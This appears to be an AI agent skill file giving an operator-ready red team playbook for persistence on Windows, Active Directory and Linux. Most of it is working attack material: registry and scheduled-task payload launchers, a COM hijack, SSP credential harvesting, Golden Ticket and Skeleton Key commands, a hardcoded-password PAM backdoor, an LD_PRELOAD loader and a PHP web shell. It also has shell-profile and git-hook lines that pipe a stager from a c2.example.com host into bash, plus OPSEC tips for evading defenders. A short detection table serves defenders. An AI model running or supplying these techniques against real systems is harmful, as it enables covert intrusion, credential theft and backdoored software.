---
name: offensive-persistence
description: "Comprehensive persistence tradecraft for authorized red team engagements covering Windows and Linux mechanisms. Windows techniques include registry Run/RunOnce keys, scheduled tasks, WMI event subscriptions, DLL search order hijacking, COM object hijacking, Startup folder drops, service creation, Security Support Provider (SSP) DLL injection, and Active Directory persistence (AdminSDHolder abuse, DCShadow, Golden Ticket, Silver Ticket, Skeleton Key, SID History injection). Linux techniques include cron and at jobs, systemd timers and services, SSH authorized_keys injection, shell profile backdoors (.bashrc/.bash_profile), PAM module backdoors, LD_PRELOAD hijacking, kernel module rootkits, web shells, and Git hook abuse. Provides operator-ready command sequences for SharPersist, Impacket ticketer, schtasks, sc.exe, crontab, and systemctl with OPSEC considerations for each method. Maps to MITRE ATT&CK T1547 (Boot or Logon Autostart), T1053 (Scheduled Task/Job), T1546 (Event Triggered Execution), T1556 (Modify Authentication Process), and sub-techniques. Includes detection indicators and a rapid engagement cheatsheet."
---

# Offensive Persistence

Persistence ensures your access survives reboots, password changes, and routine
maintenance. You plant mechanisms that re-establish a session or re-execute
your payload without requiring a new initial compromise. The choice of
persistence technique depends on your privilege level, the target operating
system, the engagement scope, and the detection risk you can tolerate.

This skill covers both Windows and Linux persistence methods, from simple
registry keys to domain-level Active Directory backdoors. Every technique
here assumes you already have code execution on the target. Apply these in
authorized engagements only.

## Quick Workflow

1. Assess your current privilege level (user-level vs admin/root vs domain admin).
2. Identify the target OS version and security controls in place.
3. Select a persistence mechanism matching your access level and stealth needs.
4. Validate the persistence survives a reboot or logoff event.
5. Document the exact mechanism and location for cleanup during engagement close.
6. Layer multiple persistence methods at different privilege levels when scope allows.
7. Prefer reversible methods that you can fully remove during remediation.

---

## Windows: Registry Autostart

Registry Run and RunOnce keys execute commands at user logon or system startup.
These are the simplest persistence mechanisms and work at both user and admin
privilege levels.

```powershell
# User-level persistence (HKCU, no admin required)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Users\Public\payload.exe" /f

# Machine-level persistence (HKLM, requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /t REG_SZ /d "C:\Windows\Temp\svc.exe" /f

# RunOnce -- executes once then deletes the key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "powershell -ep bypass -w hidden -f C:\Users\Public\init.ps1" /f
```

Using SharPersist for operational convenience:

```powershell
# Add registry Run key persistence
SharPersist.exe -t reg -c "C:\Users\Public\payload.exe" -a "" -k "hkcurun" -v "WindowsUpdate" -m add

# List current registry persistence
SharPersist.exe -t reg -k "hkcurun" -m list

# Remove it during cleanup
SharPersist.exe -t reg -k "hkcurun" -v "WindowsUpdate" -m remove
```

Additional autostart locations you should know:

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\load
HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKLM\System\CurrentControlSet\Services\<svc>\ImagePath
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
```

OPSEC note: Registry Run keys are the first place defenders check. Use
innocuous-sounding value names. Sysmon event 13 (RegistryValueSet) captures
all registry modifications to these keys.

---

## Windows: Scheduled Tasks

Scheduled tasks provide flexible persistence with precise timing control.
They survive reboots and can run as SYSTEM or any specified user.

```powershell
# Create a scheduled task running as SYSTEM at boot
schtasks /create /tn "Microsoft\Windows\Maintenance\SecurityScan" /tr "C:\Windows\Temp\svc.exe" /sc onstart /ru SYSTEM /f

# Create a task that runs every 15 minutes
schtasks /create /tn "CacheCleanup" /tr "powershell -ep bypass -w hidden -f C:\Users\Public\beacon.ps1" /sc minute /mo 15 /ru SYSTEM /f

# Create a task triggered by user logon
schtasks /create /tn "OneDriveSync" /tr "C:\Users\Public\payload.exe" /sc onlogon /f
```

SharPersist alternative: `SharPersist.exe -t schtask -c "C:\Windows\Temp\svc.exe" -n "SecurityScan" -m add -o logon`

Using PowerShell for more control:

```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -w hidden -f C:\ProgramData\task.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -TaskName "Microsoft\Windows\AppID\PolicyConverter" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
```

OPSEC note: Nest task names under existing Microsoft directories (e.g.,
`Microsoft\Windows\Maintenance\`) to blend in. Event 4698 records task creation.

---

## Windows: WMI Event Subscriptions

WMI event subscriptions are a powerful fileless persistence mechanism. They
consist of three components: an event filter (trigger), an event consumer
(action), and a binding that links them.

```powershell
# Create a WMI event subscription that fires on system startup
# Event Filter -- fires 60 seconds after boot
$filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{
    Name = "CoreTelemetryFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 120"
}

# Event Consumer -- execute payload
$consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments @{
    Name = "CoreTelemetryConsumer"
    CommandLineTemplate = "powershell.exe -ep bypass -w hidden -f C:\ProgramData\Microsoft\telemetry.ps1"
}

# Binding
Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

Cleanup -- remove all three components during engagement close:

```powershell
Get-WmiObject -Namespace "root\subscription" -Class "__EventFilter" -Filter "Name='CoreTelemetryFilter'" | Remove-WmiObject
Get-WmiObject -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Filter "Name='CoreTelemetryConsumer'" | Remove-WmiObject
Get-WmiObject -Namespace "root\subscription" -Class "__FilterToConsumerBinding" | Where-Object { $_.Filter -match "CoreTelemetryFilter" } | Remove-WmiObject
```

OPSEC note: WMI subscriptions are stored in the CIM repository
(`C:\Windows\System32\wbem\Repository\`). Sysmon event 19/20/21 captures
WMI filter, consumer, and binding creation. This is one of the stealthier
native persistence methods but increasingly monitored.

---

## Windows: DLL Hijacking and COM Hijacking

### DLL Search Order Hijacking

When an application loads a DLL without specifying a full path, Windows
searches directories in a defined order. You place a malicious DLL in a
directory searched before the legitimate one.

Find hijackable DLLs with Process Monitor: filter on `Result = NAME NOT FOUND`
and `Path ends with .dll`. Applications loading DLLs without full paths search
the application directory before System32, so you place your DLL alongside the
binary.

```c
// Minimal proxy DLL template (forwards calls to legit DLL)
// Compile: cl /LD /Fe:target.dll hijack.c
#include <windows.h>
#pragma comment(linker, "/export:OriginalFunc=legit.OriginalFunc")

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Execute payload in a new thread
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PayloadFunc, NULL, 0, NULL);
    }
    return TRUE;
}
```

### COM Hijacking

COM objects are resolved via registry. You insert your DLL into the lookup
chain by writing to HKCU, which takes precedence over HKLM entries.

```powershell
# Find COM objects scheduled to load (hijack candidates)
# Look for InprocServer32 keys under HKLM that do not exist under HKCU

# Hijack a COM object used by explorer.exe
# CLSID {BCDE0395-E52F-467C-8E3D-C4579291692E} -- MMDeviceEnumerator
New-Item -Path "HKCU:\Software\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}\InprocServer32" -Value "C:\Users\Public\payload.dll" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}\InprocServer32" -Name "ThreadingModel" -Value "Both" -Force
```

OPSEC note: COM hijacking under HKCU requires no admin rights. The payload
loads whenever the COM object is instantiated. Sysmon event 7 (ImageLoad)
detects suspicious DLL loads.

---

## Windows: Service and SSP Persistence

### Service Creation

```powershell
# Create a persistent service
sc create "WinDefHealthSvc" binpath= "C:\Windows\Temp\svc.exe" start= auto obj= LocalSystem
sc description "WinDefHealthSvc" "Windows Defender Health Service Monitor"
sc start "WinDefHealthSvc"

# Modify an existing service (riskier, breaks legitimate service)
sc config "wuauserv" binpath= "cmd /c C:\Windows\Temp\svc.exe & C:\Windows\System32\svchost.exe -k netsvcs -p"
```

### Security Support Provider (SSP) DLL

An SSP DLL is loaded by LSASS at boot and receives plaintext credentials
for every interactive logon. This is a powerful credential harvesting
persistence mechanism.

```powershell
# Copy SSP DLL to System32
copy mimilib.dll C:\Windows\System32\

# Register the SSP (persists across reboots)
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f

# In-memory SSP injection (does not survive reboot without registry key)
# Using mimikatz:
misc::memssp
# Credentials logged to C:\Windows\System32\mimilsa.log
```

OPSEC note: SSP persistence requires admin privileges and modifies LSASS.
Credential Guard blocks this entirely. Event 4622 (security package loaded)
fires when a new SSP is registered.

---

## Windows: Active Directory Persistence

These techniques provide domain-level persistence that survives individual
host remediation. They require domain admin or equivalent privileges.

### Golden Ticket

```bash
# Extract the KRBTGT hash
impacket-secretsdump -just-dc-user krbtgt corp.local/admin:Password1@dc01.corp.local

# Forge a Golden Ticket (valid for any service in the domain)
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-XXXXXXXXXX -domain corp.local administrator
export KRB5CCNAME=administrator.ccache

# With mimikatz
kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /krbtgt:<KRBTGT_HASH> /ptt
```

### Silver Ticket

```bash
# Forge a Silver Ticket for a specific service (e.g., CIFS on a file server)
impacket-ticketer -nthash <SVC_HASH> -domain-sid S-1-5-21-XXXXXXXXXX -domain corp.local -spn cifs/fileserver.corp.local administrator

# With mimikatz
kerberos::golden /user:administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /target:fileserver.corp.local /service:cifs /rc4:<SVC_HASH> /ptt
```

### Skeleton Key

```powershell
# Inject skeleton key into DC LSASS (all accounts accept "mimikatz" as password)
# Requires admin on DC, does NOT survive reboot
misc::skeleton

# Authenticate with skeleton key
net use \\dc01\c$ /user:corp\anyuser mimikatz
```

### AdminSDHolder Abuse

```powershell
# Grant a user full control over AdminSDHolder
# SDProp propagates this ACL to all protected groups every 60 minutes
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -PrincipalIdentity backdooruser -Rights All -Verbose

# The backdooruser will gain full control over Domain Admins, Enterprise Admins, etc.
```

### DCShadow and SID History Injection

```powershell
# DCShadow: register rogue DC and push replication changes (requires DA)
# Terminal 1: lsadump::dcshadow /object:targetuser /attribute:SIDHistory /value:S-1-5-21-XXXXXXXXXX-500
# Terminal 2: lsadump::dcshadow /push

# SID History: add DA SID to a regular user (requires DC access)
sid::add /sam:backdooruser /new:S-1-5-21-XXXXXXXXXX-512
```

OPSEC note: Golden tickets have a default 10-year validity. Defenders detect
them by looking for TGTs with lifetimes exceeding the domain policy maximum.
DCShadow is extremely stealthy but requires domain admin. Skeleton key is
lost on reboot and modifies LSASS on the DC itself.

---

## Linux: Cron, At, and Systemd Persistence

### Cron Jobs

```bash
# User-level cron (no root required)
crontab -e
# Add: */15 * * * * /home/user/.config/update.sh

# System-level cron (requires root)
echo '*/15 * * * * root /opt/.cache/beacon.sh' >> /etc/crontab

# Drop a cron file in cron.d
echo '*/15 * * * * root /opt/.cache/beacon.sh' > /etc/cron.d/logrotate-helper

# Cron directories for specific timing
cp payload.sh /etc/cron.hourly/health-check
chmod +x /etc/cron.hourly/health-check
```

### At Jobs

```bash
# Schedule a one-time execution (self-rescheduling for recurrence)
echo "/opt/.cache/beacon.sh" | at now + 1 hour
# In beacon.sh, add: echo "/opt/.cache/beacon.sh" | at now + 30 minutes
```

### Systemd Timers and Services

```bash
# Create a systemd service
cat << 'EOF' > /etc/systemd/system/system-health.service
[Unit]
Description=System Health Monitor

[Service]
Type=simple
ExecStart=/opt/.cache/beacon.sh
Restart=on-failure
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

# Create a timer for periodic execution
cat << 'EOF' > /etc/systemd/system/system-health.timer
[Unit]
Description=System Health Check Timer

[Timer]
OnBootSec=120
OnUnitActiveSec=900
Unit=system-health.service

[Install]
WantedBy=timers.target
EOF

# Enable and start
systemctl daemon-reload
systemctl enable system-health.timer
systemctl start system-health.timer
```

For user-level systemd (no root), place unit files in `~/.config/systemd/user/`
and use `systemctl --user enable/start`.

---

## Linux: Shell, SSH, and Authentication Persistence

### SSH Authorized Keys

```bash
# Inject your public key (user-level, no root required)
echo "ssh-rsa AAAA...your_key... operator@redteam" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Hide in a custom location via sshd_config (requires root)
echo "AuthorizedKeysFile .ssh/authorized_keys /etc/ssh/legacy_keys/%u" >> /etc/ssh/sshd_config
mkdir -p /etc/ssh/legacy_keys/root/
echo "ssh-rsa AAAA...your_key..." > /etc/ssh/legacy_keys/root/authorized_keys
systemctl restart sshd
```

### Shell Profile Backdoors

```bash
# Backdoor .bashrc (every interactive shell) or .bash_profile (login shell)
echo 'nohup /opt/.cache/beacon.sh &>/dev/null &' >> ~/.bashrc
echo '(curl -s https://c2.example.com/stager | bash &) 2>/dev/null' >> ~/.bash_profile
# /etc/profile affects all users (requires root)
echo 'test $(id -u) -eq 0 && nohup /opt/.cache/beacon.sh &>/dev/null &' >> /etc/profile
```

### PAM Backdoor

```c
// Malicious PAM module that accepts a backdoor password
// Compile: gcc -shared -fPIC -o pam_backdoor.so pam_backdoor.c -lpam
#include <security/pam_modules.h>
#include <string.h>

#define BACKDOOR_PASS "s3cure_backd00r"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *password = NULL;
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    if (password && strcmp(password, BACKDOOR_PASS) == 0) {
        return PAM_SUCCESS;
    }
    return PAM_AUTH_ERR;  // Fall through to next module
}
```

```bash
# Install the PAM backdoor
cp pam_backdoor.so /lib/x86_64-linux-gnu/security/
# Add to PAM configuration (before pam_unix.so)
sed -i '1a auth sufficient pam_backdoor.so' /etc/pam.d/common-auth
```

OPSEC note: PAM backdoors are powerful but modifying /etc/pam.d/ can lock
out all users if misconfigured. Test thoroughly. File integrity monitoring
(AIDE, OSSEC) detects PAM module changes.

---

## Linux: LD_PRELOAD, Kernel Modules, and Web Shells

### LD_PRELOAD Hijacking

```c
// Shared library that hooks libc functions and executes a payload
// Compile: gcc -shared -fPIC -o libsec.so preload.c -ldl
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>

__attribute__((constructor))
void init(void) {
    // Run once per process load
    if (access("/tmp/.beacon_lock", F_OK) != 0) {
        system("touch /tmp/.beacon_lock && /opt/.cache/beacon.sh &");
    }
}
```

```bash
# System-wide LD_PRELOAD (affects all dynamically linked binaries)
echo "/lib/x86_64-linux-gnu/.libsec.so" >> /etc/ld.so.preload
# Or per-user via .bashrc
echo 'export LD_PRELOAD=/lib/x86_64-linux-gnu/.libsec.so' >> ~/.bashrc
```

### Kernel Module Rootkit

A loadable kernel module (LKM) rootkit hooks VFS readdir to hide files,
processes, and network connections. It removes itself from the module list
(`list_del_init(&__this_module.list)`) to evade lsmod detection.

```bash
# Load the kernel module
insmod rootkit.ko

# Persist across reboots
cp rootkit.ko /lib/modules/$(uname -r)/kernel/drivers/misc/
depmod -a
echo "rootkit" >> /etc/modules
```

### Web Shells

```php
<?php
// Minimal PHP web shell -- blend into an existing web application
// Place in a file resembling legitimate app code
if(isset($_REQUEST['debug_token']) && $_REQUEST['debug_token'] === 'auth_key_here') {
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>
```

```bash
# Hide web shell in an existing web application directory
cp shell.php /var/www/html/wp-includes/class-wp-locale-debug.php

# JSP web shell for Java applications
# Place in the webapps directory of Tomcat/JBoss
```

### Git Hooks

```bash
# Backdoor a Git hook in a repository developers use
cat << 'EOF' > /path/to/repo/.git/hooks/post-merge
#!/bin/bash
nohup /opt/.cache/beacon.sh &>/dev/null &
EOF
chmod +x /path/to/repo/.git/hooks/post-merge

# pre-commit hook executes on every commit
cat << 'EOF' > /path/to/repo/.git/hooks/pre-commit
#!/bin/bash
(curl -s https://c2.example.com/stager | bash &) 2>/dev/null
exit 0
EOF
chmod +x /path/to/repo/.git/hooks/pre-commit
```

---

## Detection / Defender View

| Technique | Primary Detection | Key Indicators |
|-----------|------------------|----------------|
| Registry Run keys | Sysmon 13 (RegistryValueSet) | New values in Run/RunOnce paths |
| Scheduled tasks | Event 4698 (task created) | Tasks in non-standard paths, SYSTEM context |
| WMI subscriptions | Sysmon 19/20/21 | New permanent event consumers |
| DLL hijacking | Sysmon 7 (ImageLoad) | DLLs loaded from unusual directories |
| COM hijacking | Registry monitoring | HKCU InprocServer32 overrides |
| Service creation | Event 7045, 4697 | New services with suspicious binpaths |
| SSP DLL | Event 4622 | New security packages in LSA config |
| Golden/Silver tickets | Event 4768/4769 | TGTs with abnormal lifetime or encryption |
| DCShadow | Replication metadata changes | Rogue DC registration (SPNs) |
| Cron/systemd | File integrity monitoring | New cron entries, new unit files |
| SSH keys | authorized_keys monitoring | New keys, modified AuthorizedKeysFile |
| PAM modules | File integrity monitoring | Modified pam.d configs, new .so files |
| LD_PRELOAD | Check /etc/ld.so.preload | Unexpected entries in preload or env |
| Kernel modules | lsmod, kmod monitoring | Unknown modules, modified /etc/modules |
| Web shells | WAF, file integrity, YARA | Small PHP/JSP files with exec functions |

Key defender controls:
- **AppLocker/WDAC** restricts which executables and DLLs can run.
- **Credential Guard** blocks SSP DLL injection and LSASS credential harvesting.
- **Protected Users group** prevents NTLM and caching for sensitive accounts.
- **AIDE/OSSEC** detects file integrity changes on Linux systems.
- **auditd** rules capture file creation in cron directories and module loading.
- **Autoruns** (Sysinternals) enumerates all autostart locations on Windows.

---

## Engagement Cheatsheet

```text
SCENARIO                          TECHNIQUE                    TOOL / COMMAND
-------------------------------   --------------------------   ----------------------------------------
User-level Windows, quick          Registry Run key             reg add HKCU\...\Run
User-level Windows, reliable       Scheduled task (user)        schtasks /create /sc onlogon
Admin Windows, stealthy            WMI event subscription       Set-WmiInstance __EventFilter
Admin Windows, service             Service creation             sc create ... start= auto
Admin Windows, cred harvest        SSP DLL                      mimilib.dll + LSA registry
Domain admin, long-term            Golden Ticket                impacket-ticketer / kerberos::golden
Domain admin, targeted service     Silver Ticket                impacket-ticketer -spn
Domain admin, ACL abuse            AdminSDHolder                Add-DomainObjectAcl
User-level Linux, quick            Cron job                     crontab -e
User-level Linux, SSH              authorized_keys              echo key >> authorized_keys
Root Linux, reliable               Systemd service + timer      systemctl enable
Root Linux, stealthy               LD_PRELOAD                   /etc/ld.so.preload
Root Linux, deep                   Kernel module                insmod + /etc/modules
Web server access                  Web shell                    PHP/JSP in webroot
Developer environment              Git hooks                    .git/hooks/post-merge
```

MITRE ATT&CK references:
- T1547 -- Boot or Logon Autostart Execution (.001 Registry Run Keys, .004 Winlogon, .005 SSP)
- T1053 -- Scheduled Task/Job (.002 At, .003 Cron, .005 Scheduled Task)
- T1546 -- Event Triggered Execution (.003 WMI, .015 COM Hijack)
- T1556 -- Modify Authentication Process (.003 Pluggable Auth Modules)
- T1543 -- Create or Modify System Process (.003 Windows Service)
- T1574 -- Hijack Execution Flow (.001 DLL Search Order, .012 COM Hijacking)
- T1558 -- Steal or Forge Kerberos Tickets (.001 Golden Ticket, .002 Silver Ticket)
- T1098 -- Account Manipulation (.003 Additional Cloud Roles)
- T1505 -- Server Software Component (.003 Web Shell)

---

## Key References

- SharPersist: https://github.com/mandiant/SharPersist
- Mimikatz wiki: https://github.com/gentilkiwi/mimikatz/wiki
- Impacket: https://github.com/fortra/impacket
- PayloadsAllTheThings -- Persistence: https://github.com/swisskyrepo/PayloadsAllTheThings
- The Hacker Recipes -- AD Persistence: https://www.thehacker.recipes/ad/persistence
- MITRE ATT&CK Persistence: https://attack.mitre.org/tactics/TA0003/
- Linux Persistence Techniques (Pepe Berba): https://pberba.github.io/security/2022/02/06/linux-threat-hunting-for-persistence-systemd-timers-cron/
- Autoruns (Sysinternals): https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
